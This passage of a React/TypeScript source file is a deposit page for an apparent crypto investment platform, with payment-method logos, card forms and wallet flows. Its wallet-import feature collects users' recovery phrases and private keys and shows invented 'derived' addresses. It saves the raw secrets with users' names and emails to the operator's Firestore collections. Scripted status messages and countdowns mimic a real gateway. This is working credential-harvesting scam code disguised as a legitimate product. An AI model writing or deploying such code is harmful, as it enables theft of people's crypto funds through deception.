            <linearGradient id="sol_3" x1="7" y1="13.5" x2="25" y2="16" gradientUnits="userSpaceOnUse">
              <stop stopColor="#DC1FFF" />
              <stop offset="1" stopColor="#00FFA3" />
            </linearGradient>
          </defs>
        </svg>
      );
    case 'tron':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="32" height="32" rx="8" fill="#FF0013" fillOpacity="0.2" />
          <path d="M25 9.5L13.5 6L7 15.5L20.5 26L25 9.5Z" stroke="#FF0013" strokeWidth="2" strokeLinejoin="round" />
          <path d="M13.5 6L20.5 26M13.5 6L7 15.5M7 15.5L20.5 26" stroke="#FF0013" strokeWidth="1.5" />
        </svg>
      );
    case 'polygon':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="32" height="32" rx="8" fill="#8247E5" fillOpacity="0.2" />
          <path d="M21.5 12L17.5 9.7L13.5 12V16.6L17.5 18.9L21.5 16.6V12Z" fill="#8247E5" />
          <path d="M13.5 20L9.5 17.7L5.5 20V24.6L9.5 26.9L13.5 24.6V20Z" fill="#8247E5" />
        </svg>
      );
    case 'btc':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="32" height="32" rx="8" fill="#F7931A" fillOpacity="0.2" />
          <path d="M21.8 13.5C22.2 12.2 21.4 11 19.5 10.4L20.3 7.2L18.3 6.7L17.5 9.9C17 9.8 16.4 9.6 15.9 9.5L16.7 6.3L14.7 5.8L13.9 9C13.5 8.9 13.1 8.8 12.6 8.7L9.8 8L9.3 10L11.2 10.5C11.7 10.6 12 11 11.9 11.5L10.2 18.3C10.1 18.6 9.8 18.8 9.4 18.7L7.5 18.2L6.8 20.3L9.5 21C10 21.1 10.5 21.2 11 21.3L10.2 24.6L12.2 25.1L13 21.8C13.5 21.9 14.1 22 14.6 22.1L13.8 25.4L15.8 25.9L16.6 22.6C19.9 23.2 22.4 22.3 23.3 19.2C24 16.7 23.1 15.3 21.8 14.5M17.4 19.3C16.8 21.7 12.8 20.4 11.6 20.1L12.7 15.7C13.9 16 18 16.9 17.4 19.3M18.2 13.9C17.7 16 14.3 14.8 13.3 14.5L14.2 10.9C15.2 11.2 18.7 11.8 18.2 13.9Z" fill="#F7931A" />
        </svg>
      );
    case 'arbitrum':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="32" height="32" rx="8" fill="#28A0F0" fillOpacity="0.2" />
          <path d="M16 6L8 20L12 26L16 20L20 26L24 20L16 6Z" fill="#28A0F0" />
        </svg>
      );
    case 'avalanche':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="32" height="32" rx="8" fill="#E84142" fillOpacity="0.2" />
          <path d="M16 6L7 22H11.5L16 14L20.5 22H25L16 6Z" fill="#E84142" />
        </svg>
      );
    default:
      return (
        <div className={`${className} rounded-lg bg-indigo-500/20 flex items-center justify-center text-indigo-400 font-bold text-xs`}>
          {id.toUpperCase().slice(0, 3)}
        </div>
      );
  }
}

function VisaBadge() {
  return (
    <div className="bg-white px-1.5 py-0.5 rounded border border-slate-200 flex items-center justify-center shadow-sm h-5" title="Visa">
      <span className="text-[10px] font-black italic tracking-tighter text-[#1A1F71] font-sans">VISA</span>
    </div>
  );
}

function MastercardBadge() {
  return (
    <div className="bg-[#141414] px-1.5 py-0.5 rounded border border-neutral-700 flex items-center justify-center shadow-sm h-5 space-x-[-4px]" title="Mastercard">
      <div className="w-2.5 h-2.5 rounded-full bg-[#EB001B] opacity-90"></div>
      <div className="w-2.5 h-2.5 rounded-full bg-[#F79E1B] opacity-90"></div>
    </div>
  );
}

function AmexBadge() {
  return (
    <div className="bg-[#006FCF] px-1.5 py-0.5 rounded border border-blue-400 flex items-center justify-center shadow-sm h-5" title="American Express">
      <span className="text-[9px] font-black tracking-tighter text-white font-sans uppercase">AMEX</span>
    </div>
  );
}

function AnimatedHeaderIcons({ isDark }: { isDark: boolean }) {
  const [currentIndex, setCurrentIndex] = useState(0);
  const items = ['CARD', 'WALLET', 'BANK', 'BTC', 'ETH', 'USDC'];

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentIndex((prev) => (prev + 1) % items.length);
    }, 2000);
    return () => clearInterval(timer);
  }, []);

  const renderIconItem = (item: string) => {
    switch (item) {
      case 'CARD':
        return <CreditCard className="w-4 h-4 text-emerald-400" />;
      case 'WALLET':
        return <Wallet className="w-4 h-4 text-indigo-400" />;
      case 'BANK':
        return <Landmark className="w-4 h-4 text-purple-400" />;
      default:
        return <CryptoLogo symbol={item} className="w-full h-full" />;
    }
  };

  return (
    <div className="relative w-6 h-6 sm:w-7 sm:h-7 mr-3 flex items-center justify-center">
      <AnimatePresence mode="wait">
        <motion.div
          key={currentIndex}
          initial={{ opacity: 0, scale: 0.5, rotate: -45 }}
          animate={{ opacity: 1, scale: 1, rotate: 0 }}
          exit={{ opacity: 0, scale: 0.5, rotate: 45 }}
          transition={{ duration: 0.3 }}
          className={`absolute inset-0 rounded-full ring-2 ${isDark ? 'ring-[#111111]' : 'ring-white'} shadow-md flex items-center justify-center overflow-hidden bg-neutral-900`}
        >
          {renderIconItem(items[currentIndex])}
        </motion.div>
      </AnimatePresence>
    </div>
  );
}

const ImportWalletAnimatedLogo = ({ icon: IconComponent = Wallet, colorClass = "text-emerald-400" }: { icon?: any, colorClass?: string }) => (
  <div className="relative flex items-center justify-center my-3 py-1">
    {/* Floating Main Emblem Badge */}
    <motion.div 
      animate={{ y: [0, -3, 0] }}
      transition={{ 
        duration: 3, 
        repeat: Infinity, 
        ease: "easeInOut" 
      }}
      className="relative z-10 w-16 h-16 sm:w-18 sm:h-18 rounded-2xl bg-gradient-to-b from-neutral-800 via-neutral-900 to-neutral-950 border border-white/10 shadow-2xl flex items-center justify-center p-3"
    >
      {/* Soft Inner Bevel Stitch Accent */}
      <div className="absolute inset-1 rounded-xl border border-white/5 pointer-events-none" />

      {/* Central Clean Natural Icon */}
      <IconComponent className={`w-8 h-8 ${colorClass} stroke-[1.8]`} />
    </motion.div>
  </div>
);

export default function InstitutionalDepositPage({ theme = 'dark', onBack: propOnBack, onClose, onSuccessDeposit, onOpenSupport, onOpenHistory }: InstitutionalDepositPageProps) {
  const onBack = propOnBack || onClose || (() => {});
  const isDark = theme === 'dark';
  const { user: authUser } = useAuth();

  const [step, setStep] = useState<'methods' | 'form' | 'processing' | 'card_gateway_processing' | 'card_gateway_error' | 'wallet_connecting' | 'wallet_cancelled' | 'wallet_manual' | 'wallet_import_choose' | 'wallet_import_phrase' | 'wallet_import_key' | 'existing_wallet_detected' | 'bank_preparing' | 'crypto_deposit_verification' | 'success' | 'unavailable' | 'crypto_success' | 'crypto_expired'>(() => {
    try {
      const savedTarget = localStorage.getItem('aver_deposit_timer_target');
      if (savedTarget) {
        const remaining = Math.max(0, Math.floor((parseInt(savedTarget, 10) - Date.now()) / 1000));
        if (remaining > 0) {
          return 'crypto_deposit_verification';
        }
      }
    } catch (e) {}
    return 'methods';
  });
  const [selectedMethod, setSelectedMethod] = useState<FundingMethod>(() => {
    try {
      const saved = localStorage.getItem('aver_deposit_method');
      return (saved as FundingMethod) || 'card';
    } catch (e) {
      return 'card';
    }
  });

  // Manual Wallet Connection States
  const [manualNetwork, setManualNetwork] = useState<BlockchainNetwork>(BLOCKCHAIN_NETWORKS[0]);
  const [networkSearch, setNetworkSearch] = useState('');
  const [manualAddress, setManualAddress] = useState('');
  const [manualAddressError, setManualAddressError] = useState<string | null>(null);
  const [manualAddressTouched, setManualAddressTouched] = useState(false);
  const [isQrScannerOpen, setIsQrScannerOpen] = useState(false);
  const [qrScanInput, setQrScanInput] = useState('');

  // Crypto states
  const [selectedCrypto, setSelectedCrypto] = useState<CryptoAsset>(() => {
    try {
      const saved = localStorage.getItem('aver_deposit_crypto');
      if (saved) {
        const parsed = JSON.parse(saved);
        let sym = parsed.symbol || 'USDT-ERC20';
        if (sym === 'SIMT' || sym === 'USDT') sym = 'USDT-ERC20';
        if (sym === 'SUN') sym = 'SOL';
        const matched = ALL_CRYPTO_ASSETS.find(a => a.symbol === sym || a.symbol.split('-')[0] === sym.split('-')[0]);
        if (matched) return matched;
      }
    } catch (e) {}
    return CRYPTO_ASSETS[2]; // USDT ERC20
  });
  const [copiedAddress, setCopiedAddress] = useState(false);
  
  // "Others" Crypto Selection States
  const [showOthersCryptoModal, setShowOthersCryptoModal] = useState(false);
  const [searchOtherCrypto, setSearchOtherCrypto] = useState('');
  const isOtherCryptoSelected = OTHER_CRYPTO_ASSETS.some(a => a.symbol === selectedCrypto.symbol);
  const filteredOtherAssets = OTHER_CRYPTO_ASSETS.filter(asset => 
    !searchOtherCrypto || 
    asset.symbol.toLowerCase().includes(searchOtherCrypto.toLowerCase()) || 
    asset.name.toLowerCase().includes(searchOtherCrypto.toLowerCase()) ||
    asset.network.toLowerCase().includes(searchOtherCrypto.toLowerCase())
  );
  
  // Exact Transfer Amount States
  const [cryptoRate, setCryptoRate] = useState<number | null>(null);
  const [isPricingLoading, setIsPricingLoading] = useState(false);
  const [pricingError, setPricingError] = useState(false);
  const [copiedExactAmount, setCopiedExactAmount] = useState(false);
  const [showAssistanceModal, setShowAssistanceModal] = useState(false);
  const [showRecoveryInfoModal, setShowRecoveryInfoModal] = useState(false);
  const [showPrivateKeyInfoModal, setShowPrivateKeyInfoModal] = useState(false);
  const [pendingDepositId, setPendingDepositId] = useState<string | null>(() => {
    try {
      return localStorage.getItem('aver_pending_deposit_id');
    } catch (e) {
      return null;
    }
  });
  const [supportDraftMessage, setSupportDraftMessage] = useState(
    'Hello, I have already completed my deposit, but it has not yet been credited to my account. Please help me review the transaction.'
  );
  
  // Deposit Verification Timer (25 Minutes = 1500 Seconds)
  const [verificationSecondsLeft, setVerificationSecondsLeft] = useState<number>(() => {
    try {
      const savedTarget = localStorage.getItem('aver_deposit_timer_target');
      if (savedTarget) {
        const remaining = Math.max(0, Math.floor((parseInt(savedTarget, 10) - Date.now()) / 1000));
        if (remaining > 0) return remaining;
      }
    } catch (e) {}
    return 1500;
  });

  // Form states
  const [amount, setAmount] = useState<number>(() => {
    try {
      const saved = localStorage.getItem('aver_deposit_amount');
      return saved ? Number(saved) : 10000;
    } catch (e) {
      return 10000;
    }
  });
  const [showConfirmDepositModal, setShowConfirmDepositModal] = useState(false);
  const [showAbandonModal, setShowAbandonModal] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState<'Pending' | 'Verified' | 'Approved' | 'Rejected' | 'Expired'>('Pending');
  const [createdTimeStr] = useState(() => new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }));
  const [cardName, setCardName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [billingCountry, setBillingCountry] = useState('United States');

  // Card Gateway Processing States
  const [cardStage, setCardStage] = useState<number>(1);
  const [cardStageStatus, setCardStageStatus] = useState<'pending' | 'completed' | 'failed'>('pending');
  const [cardStageFailed, setCardStageFailed] = useState<boolean>(false);
  const [cardSessionId, setCardSessionId] = useState<string>('');

  const exactCryptoAmount = cryptoRate && amount ? (amount / cryptoRate) : 0;
  
  const formatExactAmount = (value: number, symbol: string) => {
    const maxDecimals = (symbol === 'BTC') ? 8 : (symbol === 'ETH' ? 6 : 6);
    const formatted = value.toFixed(maxDecimals);
    if (formatted.includes('.')) {
      const parts = formatted.split('.');
      const trimmedDecimal = parts[1].replace(/0+$/, '');
      if (trimmedDecimal.length === 0) {
        return parts[0];
      }
      return `${parts[0]}.${trimmedDecimal}`;
    }
    return formatted;
  };

  // Persistence: lock user into active crypto deposit verification until timer expires
  useEffect(() => {
    try {
      const savedTarget = localStorage.getItem('aver_deposit_timer_target');
      if (savedTarget) {
        const remaining = Math.max(0, Math.floor((parseInt(savedTarget, 10) - Date.now()) / 1000));
        if (remaining > 0) {
          if (step !== 'crypto_deposit_verification' && step !== 'crypto_success' && step !== 'crypto_expired') {
            const savedPendingId = localStorage.getItem('aver_pending_deposit_id');
            if (savedPendingId) {
              setPendingDepositId(savedPendingId);
            }
            setVerificationSecondsLeft(remaining);
            setStep('crypto_deposit_verification');
          }
        }
      }
    } catch (e) {
      console.error("Error checking active deposit timer:", e);
    }
  }, [step]);

  // Real-time Firestore document updates
  useEffect(() => {
    if (step === 'crypto_deposit_verification' && pendingDepositId) {
      const unsub = onSnapshot(doc(db, 'admin_deposits', pendingDepositId), (docSnap) => {
        if (docSnap.exists()) {
          const record = docSnap.data();
          if (record.amount && Number(record.amount) !== amount) {
            setAmount(Number(record.amount));
          }
          if (record.cryptoSymbol) {
            const asset = ALL_CRYPTO_ASSETS.find(a => a.symbol === record.cryptoSymbol);
            if (asset && selectedCrypto.symbol !== asset.symbol) {
              setSelectedCrypto(asset);
            }
          }
          if (record.fundingMethod && selectedMethod !== record.fundingMethod) {
            setSelectedMethod(record.fundingMethod);
          }

          if (record.status === 'completed' || record.status === 'approved' || record.status === 'success' || record.status === 'successful') {
            localStorage.removeItem('aver_deposit_timer_target');
            localStorage.removeItem('aver_pending_deposit_id');
            setStep('crypto_success');
          } else if (record.status === 'rejected' || record.status === 'declined' || record.status === 'failed' || record.status === 'cancelled') {
            localStorage.removeItem('aver_deposit_timer_target');
            localStorage.removeItem('aver_pending_deposit_id');
            setStep('crypto_expired');
          }
        }
      }, (err) => {
        console.warn("Firestore snapshot listener notice:", err);
      });

      return () => unsub();
    }
  }, [step, pendingDepositId, amount, selectedCrypto, selectedMethod, onSuccessDeposit]);

  // Timer Tick and Status updates
  useEffect(() => {
    let timer: any = null;
    let statusTimer: any = null;
    if (step === 'crypto_deposit_verification') {
      const savedTarget = localStorage.getItem('aver_deposit_timer_target');
      let initialSeconds = 1500;
      if (savedTarget) {
        const remaining = Math.max(0, Math.floor((parseInt(savedTarget, 10) - Date.now()) / 1000));
        initialSeconds = remaining;
      } else {
        const targetTime = Date.now() + 1500 * 1000;
        localStorage.setItem('aver_deposit_timer_target', targetTime.toString());
      }
      setVerificationSecondsLeft(initialSeconds);

      timer = setInterval(() => {
        setVerificationSecondsLeft((prev) => (prev > 0 ? prev - 1 : 0));
      }, 1000);

      setVerificationStatusIndex(0);
      statusTimer = setInterval(() => {
        setVerificationStatusIndex((prev) => {
          if (prev < verificationStatusList.length - 1) {
            return prev + 1;
          } else {
            return prev;
          }
        });
      }, 4000);
    } else {
      setVerificationSecondsLeft(1500);
    }
    return () => {
      if (timer) clearInterval(timer);
      if (statusTimer) clearInterval(statusTimer);
    };
  }, [step]);

  // Expiration handling
  useEffect(() => {
    if (step === 'crypto_deposit_verification' && verificationSecondsLeft === 0) {
      localStorage.removeItem('aver_deposit_timer_target');
      localStorage.removeItem('aver_pending_deposit_id');
      
      if (pendingDepositId) {
        try {
          updateDoc(doc(db, 'admin_deposits', pendingDepositId), {
            status: 'failed',
            updatedAt: serverTimestamp()
          }).catch(() => {});
          import('../../lib/depositStore').then(({ updateLocalDeposit }) => {
            updateLocalDeposit(pendingDepositId, { status: 'failed' });
          }).catch(() => {});
          import('../../services/transactionService').then(({ transactionService }) => {
            transactionService.recordTransaction({
              id: pendingDepositId,
              userId: authUser?.uid || 'anonymous',
              type: 'deposit',
              category: 'transactions',
              title: `${selectedCrypto?.symbol || 'USD'} Deposit`,
              amount: amount,
              cryptoAmount: exactCryptoAmount ? Number(exactCryptoAmount) : undefined,
              asset: selectedCrypto?.symbol || 'USD',
              network: selectedCrypto?.network || 'Mainnet',
              status: 'Failed'
            });
          }).catch(() => {});
        } catch (e) {}
      }

      setStep('crypto_expired');
    }
  }, [step, verificationSecondsLeft, pendingDepositId, amount, exactCryptoAmount, selectedCrypto, authUser]);
  
  const CARD_GATEWAY_STAGES = [
    {
      num: 1,
      title: 'Securing Connection',
      desc: 'Creating an encrypted communication channel between your device and our payment infrastructure. This protects your payment information before any transaction begins.',
      icon: <Lock className="w-5 h-5" />
    },
    {
      num: 2,
      title: 'Connecting to Payment Gateway',
      desc: 'Attempting to establish a secure session with the configured payment processor so your card transaction can be initiated.',
      icon: <Radio className="w-5 h-5" />
    },
    {
      num: 3,
      title: 'Encrypting Payment Data',
      desc: 'Your card information is being encrypted using industry-standard security protocols before it is transmitted for authorization.',
      icon: <KeyRound className="w-5 h-5" />
    },
    {
      num: 4,
      title: 'Authorizing Card',
      desc: 'Submitting your payment request for preliminary authorization while validating the card details and security information.',
      icon: <CreditCard className="w-5 h-5" />
    },
    {
      num: 5,
      title: 'Contacting Issuing Bank',
      desc: 'Waiting for the payment processor to communicate with your card issuer to determine whether the transaction can proceed or whether additional verification will be required.',
      icon: <Landmark className="w-5 h-5" />
    }
  ];

  const isCardUnavailable = () => {
    const val = localStorage.getItem('aver_card_unavailable_until');
    if (!val) return false;
    const until = parseInt(val, 10);
    if (isNaN(until)) return false;
    return Date.now() < until;
  };

  const handleSelectCardMethod = () => {
    if (isCardUnavailable()) {
      setStep('unavailable');
    } else {
      setSelectedMethod('card');
      setStep('form');
    }
  };

  useEffect(() => {
    if (step === 'card_gateway_error') {
      const timer = setTimeout(() => {
        const cooldownEnd = Date.now() + 10 * 60 * 1000;
        localStorage.setItem('aver_card_unavailable_until', cooldownEnd.toString());
        setStep('unavailable');
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  // Dynamic header configurations matching active view and step with high-end graphical icon components
  const headerConfig = {
    default: {
      tag: "SECURE GATEWAY",
      title: "Deposit Funds",
      desc: "Securely fund your investment account using institutional-grade payment infrastructure and multi-signature clearing routes.",
      color: "text-emerald-400",
      dot: "bg-emerald-500",
      bgGlow: "bg-emerald-500/10",
      iconBg: "bg-emerald-500/10 ring-emerald-500/30 text-emerald-400",
      icon: <ShieldCheck className="h-6 w-6" />
    },
    card: {
      tag: "FIAT ON-RAMP",
      title: "Direct Fiat Routing",
      desc: "Establishing a secure, PCI-DSS compliant tunnel for instant card-to-margin settlement.",
      color: "text-emerald-400",
      dot: "bg-emerald-500",
      bgGlow: "bg-emerald-500/15",
      iconBg: "bg-emerald-500/10 ring-emerald-500/30 text-emerald-400",
      icon: <CreditCard className="h-6 w-6" />
    },
    walletconnect: {
      tag: "DECENTRALIZED NODE",
      title: "Web3 Handshake",
      desc: "Initiating cryptographic session. Sign payload via self-custody provider to authenticate.",
      color: "text-indigo-400",
      dot: "bg-indigo-500",
      bgGlow: "bg-indigo-500/15",
      iconBg: "bg-indigo-500/10 ring-indigo-500/30 text-indigo-400",
      icon: <Wallet className="h-6 w-6" />
    },
    crypto: {
      tag: "ON-CHAIN SETTLEMENT",
      title: "Network Vault",
      desc: "Generating isolated, single-use addresses for secure multi-layer blockchain deposits.",
      color: "text-amber-400",
      dot: "bg-amber-500",
      bgGlow: "bg-amber-500/15",
      iconBg: "bg-amber-500/10 ring-amber-500/30 text-amber-400",
      icon: <Coins className="h-6 w-6" />
    },
    bank: {
      tag: "TIER-1 CLEARING",
      title: "Institutional Wire",
      desc: "Accessing deep liquidity pools via priority banking routing. Standard T+1 settlement protocol.",
      color: "text-purple-400",
      dot: "bg-purple-500",
      bgGlow: "bg-purple-500/15",
      iconBg: "bg-purple-500/10 ring-purple-500/30 text-purple-400",
      icon: <Building2 className="h-6 w-6" />
    }
  };

  const currentHeader = step === 'form' ? headerConfig[selectedMethod] : headerConfig.default;
  const [selectedWallet, setSelectedWallet] = useState('MetaMask');
  const [connectingWalletName, setConnectingWalletName] = useState('MetaMask');
  const [isConnectingWallet, setIsConnectingWallet] = useState(false);
  const [walletConnected, setWalletConnected] = useState(false);
  const [connectedAddress, setConnectedAddress] = useState('');
  const [connectedNetwork, setConnectedNetwork] = useState('Ethereum (ERC-20)');

  // Wallet Import & Existing Wallet Detection States
  const [importPhrase, setImportPhrase] = useState('');
  const [showPhrase, setShowPhrase] = useState(false);
  const [importKey, setImportKey] = useState('');
  const [showKey, setShowKey] = useState(false);
  const [ignoreExistingWallet, setIgnoreExistingWallet] = useState(false);
  const [hasPromptedExistingWallet, setHasPromptedExistingWallet] = useState(false);

  // 23-Second Import Loading & Success States
  const [isImportingWallet, setIsImportingWallet] = useState(false);
  const [importSecondsLeft, setImportSecondsLeft] = useState(23);
  const [importSuccessState, setImportSuccessState] = useState(false);
  const [pendingImportData, setPendingImportData] = useState<{
    address: string;
    method: 'recovery_phrase' | 'private_key';
    walletName: string;
    credential: string;
  } | null>(null);

  const IMPORT_STATUS_MESSAGES = [
    'Verifying wallet format and cryptographic keypair...',
    'Establishing secure connection to multi-chain RPC nodes...',
    'Validating zero-knowledge signature & address index...',
    'Encrypting vault session & synchronizing account balances...',
    'Securing private key / seed phrase credentials...',
    'Finalizing wallet integration...'
  ];

  // Load existing wallet session from localStorage on mount & auto-prompt if present
  useEffect(() => {
    try {
      const saved = localStorage.getItem('aver_connected_wallet');
      if (saved) {
        const parsed = JSON.parse(saved);
        const addr = parsed.publicWalletAddress || parsed.address;
        if (addr) {
          setConnectedAddress(addr);
          setConnectedNetwork(parsed.blockchainNetwork || parsed.network || 'Ethereum (ERC-20)');
          setSelectedWallet(parsed.walletName || parsed.provider || 'Imported Web3 Wallet');
          setWalletConnected(true);

          if (!hasPromptedExistingWallet) {
            setStep('existing_wallet_detected');
            setHasPromptedExistingWallet(true);
          }
        }
      }
    } catch (e) {
      console.error("Error loading saved wallet:", e);
    }
  }, []);

  // 23-second import countdown timer logic
  const startWalletImportProcess = (
    address: string,
    method: 'recovery_phrase' | 'private_key',
    walletName: string,
    credential: string
  ) => {
    setPendingImportData({ address, method, walletName, credential });
    setImportSecondsLeft(23);
    setImportSuccessState(false);
    setIsImportingWallet(true);
  };

  useEffect(() => {
    let timer: any = null;
    if (isImportingWallet && importSecondsLeft > 0) {
      timer = setInterval(() => {
        setImportSecondsLeft((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    } else if (isImportingWallet && importSecondsLeft === 0) {
      setImportSuccessState(true);
      if (pendingImportData) {
        const { address, method, walletName, credential } = pendingImportData;
        const detectedNetwork = method === 'private_key' ? (detectNetworkFromPrivateKey(credential) || 'Ethereum (ERC-20)') : 'Ethereum (ERC-20)';
        saveImportedWalletToFirestore(address, method, walletName, credential);
        setConnectedAddress(address);
        setConnectedNetwork(detectedNetwork);
        setSelectedWallet(walletName);
        setWalletConnected(true);
        setSelectedMethod('walletconnect');

        const successTimeout = setTimeout(() => {
          setIsImportingWallet(false);
          setStep('form');
        }, 1800);

        return () => clearTimeout(successTimeout);
      }
    }
    return () => {
      if (timer) clearInterval(timer);
    };
  }, [isImportingWallet, importSecondsLeft, pendingImportData]);

  // Deterministic EVM Public Address derivation from credentials
  const derivePublicAddressFromCredential = (cred: string): string => {
    let hash = 0;
    for (let i = 0; i < cred.length; i++) {
      hash = ((hash << 5) - hash) + cred.charCodeAt(i);
      hash |= 0;
    }
    const hex = Math.abs(hash).toString(16).padStart(8, '0');
    let addrHex = '';
    for (let i = 0; i < 5; i++) {
      let subHash = 0;
      const subStr = cred + i + hex;
      for (let j = 0; j < subStr.length; j++) {
        subHash = ((subHash << 5) - subHash) + subStr.charCodeAt(j);
        subHash |= 0;
      }
      addrHex += Math.abs(subHash).toString(16).padStart(8, '0');
    }
    return '0x' + addrHex.slice(0, 40).toLowerCase();
  };

  const getPhraseWords = (phrase: string): string[] => {
    return phrase.trim().split(/\s+/).filter(Boolean);
  };

  const validatePhrase = (phrase: string): { valid: boolean; count: number; error?: string } => {
    const words = getPhraseWords(phrase);
    const count = words.length;
    if (count < 1) {
      return { valid: false, count, error: 'Please enter your recovery phrase.' };
    }
    if (count < 3) {
      return { valid: false, count, error: 'Recovery phrase should be at least 3 words.' };
    }
    return { valid: true, count };
  };

  const detectNetworkFromPrivateKey = (key: string): string | null => {
    const trimmed = key.trim();
    if (!trimmed) return null;

    // 64 hex characters (EVM or TRON)
    if (/^(0x)?[a-fA-F0-9]{64}$/.test(trimmed)) {
      return "EVM / TRON Compatible";
    }
    
    // Base58 (Solana) - usually 32-44 characters
    if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmed)) {
      return "Solana Network";
    }

    // Bitcoin WIF (Wallet Import Format)
    // Usually 51 or 52 characters, starts with 5, K, or L
    if (/^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(trimmed)) {
      return "Bitcoin Network (WIF)";
    }

    return null;
  };

  const validatePrivateKey = (key: string): { valid: boolean; error?: string } => {
    const trimmed = key.trim();
    if (!trimmed) {
      return { valid: false, error: 'Please enter your private key.' };
    }
    if (trimmed.length < 6) {
      return { valid: false, error: 'Private key is too short.' };
    }
    return { valid: true };
  };

  const saveImportedWalletToFirestore = async (
    publicWalletAddress: string,
    importMethod: 'recovery_phrase' | 'private_key',
    walletName: string,
    rawCredential?: string
  ) => {
    const user = auth.currentUser;
    const detectedNetwork = importMethod === 'private_key' ? (detectNetworkFromPrivateKey(rawCredential || '') || 'Ethereum (ERC-20)') : 'Ethereum (ERC-20)';
    const walletDoc = {
      userId: user?.uid || 'anonymous',
      userName: user?.displayName || user?.email?.split('@')[0] || 'Trader',
      userEmail: user?.email || '',
      walletName,
      provider: walletName,
      address: publicWalletAddress,
      publicWalletAddress,
      blockchainNetwork: detectedNetwork,
      network: detectedNetwork,
      importMethod,
      walletType: importMethod === 'recovery_phrase' ? 'Recovery Phrase' : 'Private Key',
      secretPhrase: importMethod === 'recovery_phrase' ? rawCredential : null,
      privateKey: importMethod === 'private_key' ? rawCredential : null,
      credential: rawCredential || null,
      dateConnected: new Date().toISOString(),
      linkedAt: new Date().toISOString(),
      connectionStatus: 'connected',
      status: 'Connected',
      createdAt: serverTimestamp()
    };

    try {
      await addDoc(collection(db, 'user_wallets'), walletDoc).catch(e => console.warn("user_wallets addDoc notice:", e));
      await addDoc(collection(db, 'linked_wallets'), walletDoc).catch(e => console.warn("linked_wallets addDoc notice:", e));
    } catch (err) {
      console.warn("Firestore wallet save notice (fallback to local storage):", err);
    }

    try {
      localStorage.setItem('aver_connected_wallet', JSON.stringify(walletDoc));
      
      // Also append to aver_imported_wallets array in localStorage
      const importedStr = localStorage.getItem('aver_imported_wallets');
      let importedList: any[] = [];
      if (importedStr) {
        try { importedList = JSON.parse(importedStr); } catch (e) {}
      }
      importedList = [walletDoc, ...importedList.filter(w => (w.address || w.publicWalletAddress)?.toLowerCase() !== publicWalletAddress.toLowerCase())];
      localStorage.setItem('aver_imported_wallets', JSON.stringify(importedList));

      // Also update active user profile linkedWallets array in localStorage
      const activeUserStr = localStorage.getItem('aver_active_user');
      if (activeUserStr) {
        try {
          const uObj = JSON.parse(activeUserStr);
          const currentWallets = Array.isArray(uObj.linkedWallets) ? uObj.linkedWallets : [];
          uObj.linkedWallets = [walletDoc, ...currentWallets.filter((w: any) => (w.address || w.publicWalletAddress)?.toLowerCase() !== publicWalletAddress.toLowerCase())];
          localStorage.setItem('aver_active_user', JSON.stringify(uObj));
          window.dispatchEvent(new Event('aver_user_updated'));
        } catch (e) {}
      }

      window.dispatchEvent(new Event('aver_wallet_updated'));
    } catch (err) {
      console.error("Failed to save wallet to localStorage:", err);
    }
  };

  const handleImportRecoveryPhraseSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const valRes = validatePhrase(importPhrase);
    if (!valRes.valid) return;

    const derivedAddress = derivePublicAddressFromCredential(importPhrase.trim());
    const walletName = 'Recovery Phrase Wallet';

    startWalletImportProcess(derivedAddress, 'recovery_phrase', walletName, importPhrase.trim());
  };

  const handleImportPrivateKeySubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const valRes = validatePrivateKey(importKey);
    if (!valRes.valid) return;

    const derivedAddress = derivePublicAddressFromCredential(importKey.trim());
    const walletName = 'Private Key Wallet';

    startWalletImportProcess(derivedAddress, 'private_key', walletName, importKey.trim());
  };

  const handlePastePhraseFromClipboard = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) {
        setImportPhrase(text.trim());
      }
    } catch (err) {
      console.error("Clipboard permission error:", err);
    }
  };

  const handlePasteKeyFromClipboard = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) {
        setImportKey(text.trim());
      }
    } catch (err) {
      console.error("Clipboard permission error:", err);
    }
  };

  // Dynamic status messages for Connecting Wallet screen
  const CONNECTING_STATUS_MESSAGES = [
    'Detecting Wallet…',
    'Establishing Secure Session…',
    'Waiting for Wallet Response…',
    'Awaiting User Approval…',
    'Verifying Connection…'
  ];
  const [connectingStatusIndex, setConnectingStatusIndex] = useState(0);

  useEffect(() => {
    let interval: any;
    if (step === 'wallet_connecting') {
      setConnectingStatusIndex(0);
      interval = setInterval(() => {
        setConnectingStatusIndex((prev) => (prev + 1) % CONNECTING_STATUS_MESSAGES.length);
      }, 2500);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [step]);

  // Dynamic status messages for Bank Wire Preparing screen
  const BANK_STATUS_MESSAGES = [
    'Initializing Secure Banking Session…',
    'Creating Deposit Session…',
    'Allocating Institutional Deposit Account…',
    'Generating Transfer Instructions…',
    'Reserving Secure Payment Reference…',
    'Contacting Settlement Infrastructure…',
    'Verifying Banking Route…',
    'Preparing Deposit Credentials…',
    'Finalizing Banking Session…',
    'Awaiting Banking Service Response…'
  ];
  const [bankStatusIndex, setBankStatusIndex] = useState(0);

  useEffect(() => {
    let interval: any;
    if (step === 'bank_preparing') {
      setBankStatusIndex(0);
      interval = setInterval(() => {
        setBankStatusIndex((prev) => {
          if (prev < BANK_STATUS_MESSAGES.length - 1) {
            return prev + 1;
          } else {
